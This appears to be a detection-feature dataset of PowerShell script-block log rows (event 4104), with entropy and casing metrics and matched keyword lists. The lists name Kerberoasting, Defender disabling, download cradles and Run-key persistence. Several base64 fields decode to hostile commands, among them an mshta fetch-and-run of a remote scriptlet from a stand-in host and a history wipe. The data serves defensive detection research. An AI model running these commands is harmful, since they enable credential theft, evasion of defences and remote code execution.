PST-210,windows_event_4104_scriptblocktext,227,1,23,72,0.317181,0.004405,0.123348,4.884092,11,11,135,0,0,0,0,10,0,0,0,2,MsXml2.Serve;rXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-211,windows_event_4104_scriptblocktext,193,1,22,67,0.34715,0.0,0.025907,4.815399,12,12,84,0,0,0,0,0,1,0,0,1,Get-ItemP,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-212,windows_event_4104_scriptblocktext,118,1,11,33,0.279661,0.0,0.169492,4.331442,8,8,45,0,0,0,0,7,0,0,0,1,tTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
PST-213,windows_event_4104_scriptblocktext,184,1,17,26,0.141304,0.027174,0.092391,4.994522,1,1,8,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-214,windows_event_4104_scriptblocktext,151,1,18,55,0.364238,0.013245,0.02649,4.994667,9,9,53,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-215,windows_event_4104_scriptblocktext,133,1,14,12,0.090226,0.022556,0.112782,4.824453,1,1,5,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-216,windows_event_4104_scriptblocktext,92,1,8,19,0.206522,0.021739,0.032609,5.022332,1,0,54,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-217,windows_event_4104_scriptblocktext,110,1,10,17,0.154545,0.0,0.063636,4.847486,1,0,70,0,0,0,0,0,0,0,0,3,ErRoRaCTION;REcUrSe;SILeNTlyCOntInUE,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-218,windows_event_4104_scriptblocktext,77,1,8,8,0.103896,0.012987,0.103896,4.675289,1,1,16,0,0,0,0,0,0,0,0,1,Get-TimeZone,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-219,windows_event_4104_scriptblocktext,107,1,11,9,0.084112,0.018692,0.102804,4.584359,1,1,16,0,0,0,0,0,0,0,0,1,Get-LocalGroup,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-220,windows_event_4104_scriptblocktext,52,1,4,4,0.076923,0.0,0.076923,4.344107,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-221,windows_event_4104_scriptblocktext,209,1,21,41,0.196172,0.014354,0.086124,5.18149,4,3,35,0,0,0,0,0,0,0,0,2,ForEach-Object;Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-222,windows_event_4104_scriptblocktext,164,1,21,55,0.335366,0.02439,0.134146,4.726165,11,11,76,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
PST-223,windows_event_4104_scriptblocktext,310,1,10,26,0.083871,0.022581,0.009677,5.092824,1,0,188,1,188,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,2,1,1,2,1,1
PST-224,windows_event_4104_scriptblocktext,169,1,22,57,0.337278,0.0,0.047337,5.017802,11,10,75,0,0,0,3,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-225,windows_event_4104_scriptblocktext,64,1,7,6,0.09375,0.015625,0.109375,4.270765,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-226,windows_event_4104_scriptblocktext,129,1,16,22,0.170543,0.015504,0.069767,4.646584,2,0,84,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-227,windows_event_4104_scriptblocktext,201,1,32,58,0.288557,0.064677,0.024876,5.067729,1,0,157,0,0,0,10,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-228,windows_event_4104_scriptblocktext,118,1,12,10,0.084746,0.016949,0.101695,4.544537,1,1,16,0,0,0,0,0,0,0,0,1,Get-DnsClientCache,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-229,windows_event_4104_scriptblocktext,85,1,11,16,0.188235,0.047059,0.047059,4.634473,1,0,57,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-230,windows_event_4104_scriptblocktext,126,1,9,22,0.174603,0.0,0.047619,4.916271,1,0,86,1,25,0,0,0,0,0,0,1,Set-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-231,windows_event_4104_scriptblocktext,210,1,18,17,0.080952,0.004762,0.090476,4.669413,2,0,64,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-232,windows_event_4104_scriptblocktext,116,1,12,10,0.086207,0.017241,0.103448,4.552494,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-233,windows_event_4104_scriptblocktext,103,1,11,21,0.203883,0.009709,0.135922,4.78982,3,3,30,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-234,windows_event_4104_scriptblocktext,322,1,10,25,0.07764,0.021739,0.009317,4.972335,1,0,200,1,200,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0ACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAsAEgAYQBzAGgA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,3
PST-235,windows_event_4104_scriptblocktext,169,1,17,15,0.088757,0.011834,0.106509,4.708653,2,1,25,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-236,windows_event_4104_scriptblocktext,83,1,9,10,0.120482,0.024096,0.13253,4.359737,1,0,46,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-237,windows_event_4104_scriptblocktext,85,1,8,8,0.094118,0.011765,0.094118,4.599599,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-238,windows_event_4104_scriptblocktext,135,1,17,34,0.251852,0.0,0.022222,4.782496,1,0,95,0,0,0,4,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-239,windows_event_4104_scriptblocktext,178,1,12,24,0.134831,0.044944,0.044944,5.269639,2,0,85,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-240,windows_event_4104_scriptblocktext,150,1,19,13,0.086667,0.006667,0.126667,4.450153,2,0,101,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-241,windows_event_4104_scriptblocktext,162,1,15,12,0.074074,0.012346,0.092593,4.65639,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-242,windows_event_4104_scriptblocktext,116,1,10,10,0.086207,0.025862,0.086207,4.712387,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-243,windows_event_4104_scriptblocktext,125,1,15,23,0.184,0.024,0.072,4.820521,2,0,74,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-244,windows_event_4104_scriptblocktext,107,1,12,30,0.280374,0.018692,0.037383,4.615869,1,0,66,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-245,windows_event_4104_scriptblocktext,345,1,42,96,0.278261,0.011594,0.043478,5.311818,14,3,236,0,0,0,18,0,1,0,0,7,CaB1AHQAiAa;EuAuGbuaC;NEw-scHedUleDTaSKa;SqBTAc0aS;UPDaTECHeCk;aDABlAC0atWB1;naFqaSAbFaf,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-246,windows_event_4104_scriptblocktext,98,1,10,10,0.102041,0.010204,0.102041,4.659488,1,1,16,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0
PST-247,windows_event_4104_scriptblocktext,299,1,43,87,0.29097,0.006689,0.070234,5.182102,14,8,194,0,0,0,11,0,1,0,0,2,OpENprO;ThESIs.inEr,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-248,windows_event_4104_scriptblocktext,78,1,8,12,0.153846,0.0,0.064103,4.926258,1,0,40,0,0,0,0,0,0,0,0,2,GeT-PRoCESs;selEcT-oBjECt,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-249,windows_event_4104_scriptblocktext,108,1,10,9,0.083333,0.027778,0.092593,4.726761,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-250,windows_event_4104_scriptblocktext,107,1,12,21,0.196262,0.018692,0.065421,4.6882,1,0,69,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-251,windows_event_4104_scriptblocktext,314,1,10,25,0.079618,0.025478,0.009554,5.025953,1,0,192,1,192,1,0,0,0,0,0,2,FromBase64String;QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-252,windows_event_4104_scriptblocktext,131,1,12,25,0.19084,0.083969,0.061069,5.269494,2,0,41,0,0,0,0,0,0,0,0,2,FromBase64String;aW52ZW50b3J5LW5vdGU,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-253,windows_event_4104_scriptblocktext,366,1,10,26,0.071038,0.04918,0.008197,4.993846,1,0,244,1,244,1,0,0,0,0,0,2,FromBase64String;bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,mshta,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-254,windows_event_4104_scriptblocktext,88,1,11,10,0.113636,0.022727,0.125,4.675492,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-255,windows_event_4104_scriptblocktext,61,1,7,7,0.114754,0.0,0.098361,4.555486,0,0,0,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-256,windows_event_4104_scriptblocktext,129,1,11,8,0.062016,0.007752,0.085271,4.505934,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-257,windows_event_4104_scriptblocktext,193,1,24,75,0.388601,0.0,0.031088,5.088044,12,11,94,0,0,0,3,0,1,0,0,3,htA.exAMp;le.InVAl;mSHTa.eXe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-258,windows_event_4104_scriptblocktext,139,1,17,20,0.143885,0.021583,0.100719,4.665153,2,0,60,0,0,0,2,0,0,0,0,1,ConvertFrom-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-259,windows_event_4104_scriptblocktext,143,1,16,17,0.118881,0.027972,0.118881,4.756607,2,1,27,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_process,1,0,0,1,0,1,1,0,0
PST-260,windows_event_4104_scriptblocktext,85,1,8,8,0.094118,0.011765,0.094118,4.56948,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetFirewallProfile,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-261,windows_event_4104_scriptblocktext,64,1,7,6,0.09375,0.015625,0.109375,4.487955,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-262,windows_event_4104_scriptblocktext,240,1,35,97,0.404167,0.008333,0.045833,5.086823,14,13,129,0,0,0,7,0,1,0,0,1,amPlE.iN,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0
PST-263,windows_event_4104_scriptblocktext,69,1,5,5,0.072464,0.028986,0.072464,4.579772,0,0,0,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0
PST-264,windows_event_4104_scriptblocktext,101,1,11,30,0.29703,0.0,0.158416,4.554216,6,6,24,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-265,windows_event_4104_scriptblocktext,66,1,7,7,0.106061,0.015152,0.106061,4.283486,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-266,windows_event_4104_scriptblocktext,232,1,29,92,0.396552,0.0,0.060345,4.869934,14,13,121,0,0,0,5,0,1,0,0,1,geT-cHildiT,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,1,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,1,3,2,0
PST-267,windows_event_4104_scriptblocktext,181,1,19,60,0.331492,0.0,0.127072,4.511221,11,11,91,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-268,windows_event_4104_scriptblocktext,184,1,19,49,0.266304,0.0,0.163043,4.520709,11,11,94,0,0,0,0,10,0,0,0,1,Resolve-DnsN,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-269,windows_event_4104_scriptblocktext,104,1,10,11,0.105769,0.009615,0.096154,4.760529,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-270,windows_event_4104_scriptblocktext,181,1,15,18,0.099448,0.01105,0.077348,4.922298,2,0,72,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,currentversion\run,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,2,1,2,2,0,0
PST-271,windows_event_4104_scriptblocktext,113,1,9,12,0.106195,0.0,0.061947,4.692378,1,0,75,0,0,0,0,0,0,0,0,1,SamAccountName,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-272,windows_event_4104_scriptblocktext,168,1,17,42,0.25,0.011905,0.047619,4.840484,1,0,122,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-restmethod,1,0,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-273,windows_event_4104_scriptblocktext,215,1,19,48,0.223256,0.083721,0.037209,5.503226,1,0,175,0,0,0,0,0,0,0,0,4,StREAm.ReaD;cLIenT.GETsTrEaM;neW-ObjECt;system.nET.sockEts.tCPclIenT,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-274,windows_event_4104_scriptblocktext,103,1,6,5,0.048544,0.0,0.058252,4.469242,0,0,0,1,25,0,0,0,0,0,0,1,Get-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,disableRealtimeMonitoring,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-275,windows_event_4104_scriptblocktext,94,1,8,6,0.06383,0.010638,0.085106,4.48157,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetRoute,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-276,windows_event_4104_scriptblocktext,25,1,2,2,0.08,0.0,0.04,3.943465,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-277,windows_event_4104_scriptblocktext,211,1,17,52,0.246445,0.009479,0.028436,5.162663,1,0,167,0,0,0,0,0,0,0,0,3,DefaultWebProxy;Net.WebClient;Net.WebRequest,0,,0,0,0,2,downloadstring;webclient,2,0,0,2,defaultwebproxy;user-agent,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,4,4,0,0
PST-278,windows_event_4104_scriptblocktext,121,1,12,10,0.082645,0.016529,0.099174,4.690874,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-279,windows_event_4104_scriptblocktext,83,1,6,6,0.072289,0.024096,0.072289,4.706551,0,0,0,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-280,windows_event_4104_scriptblocktext,115,1,12,10,0.086957,0.017391,0.104348,4.647501,1,1,16,0,0,0,0,0,0,0,0,1,Get-LocalUser,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-281,windows_event_4104_scriptblocktext,220,1,16,41,0.186364,0.004545,0.054545,5.090679,1,0,176,0,0,0,0,0,0,0,0,1,New-ItemProperty,1,windowstyle hidden,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-282,windows_event_4104_scriptblocktext,176,1,22,52,0.295455,0.0,0.045455,4.823103,10,10,75,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-283,windows_event_4104_scriptblocktext,260,1,36,100,0.384615,0.05,0.030769,5.241128,14,13,151,0,0,0,4,0,1,0,0,3,MplE.InvaL;OkE-webrEQ;moZilLa,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,0
